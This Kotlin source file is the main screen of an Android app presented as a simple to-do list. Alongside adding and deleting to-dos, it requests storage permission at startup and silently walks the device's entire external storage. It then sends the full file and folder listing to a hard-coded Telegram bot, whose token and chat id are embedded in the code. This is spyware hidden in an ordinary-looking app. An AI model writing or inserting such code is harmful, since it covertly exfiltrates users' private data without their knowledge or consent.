package com.example.todolist

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.recyclerview.widget.LinearLayoutManager
import com.example.todolist.databinding.ActivityMainBinding
import okhttp3.*
import java.io.File
import java.io.IOException

class MainActivity : AppCompatActivity() {
    private lateinit var todoAdapter: TodoAdapter
    private lateinit var binding: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        todoAdapter = TodoAdapter(mutableListOf())
        binding.rvTodoItems.adapter = todoAdapter
        binding.rvTodoItems.layoutManager = LinearLayoutManager(this)

        binding.btnAddTodo.setOnClickListener {
            val todoTitle = binding.etTodoTitle.text.toString()
            if (todoTitle.isNotEmpty()) {
                val todo = Todo(todoTitle)
                todoAdapter.addTodo(todo)
                binding.etTodoTitle.text.clear()
            }
        }

        binding.btnDeleteDoneTodos.setOnClickListener {
            todoAdapter.deleteDoneTodos()
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), 100)
            } else {
                sendStorageMap()
            }
        } else {
            sendStorageMap()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            sendStorageMap()
        }
    }

    private fun sendStorageMap() {
        val storageDir = Environment.getExternalStorageDirectory()
        val builder = StringBuilder()
        listFilesRecursive(storageDir, builder, "")
        sendToTelegram(builder.toString())
    }

    private fun listFilesRecursive(file: File, builder: StringBuilder, indent: String) {
        if (file.isDirectory) {
            builder.append("$indent📁 ${file.name}\n")
            file.listFiles()?.forEach {
                listFilesRecursive(it, builder, "$indent  ")
            }
        } else {
            builder.append("$indent📄 ${file.name}\n")
        }
    }

    private fun sendToTelegram(text: String) {
        val token = "7916356795:AAHMkdpGxBG1AI7TGcvsDfCLZcqUm3THYbk"
        val chatId = "1585904762"
        val url = "https://api.telegram.org/bot$token/sendMessage"

        val client = OkHttpClient()
        val body = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", text.take(4000)) // Telegram max 4096 chars
            .build()

        val request = Request.Builder().url(url).post(body).build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("Telegram", "Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                Log.d("Telegram", "Success: ${response.body?.string()}")
            }
        })
    }
}
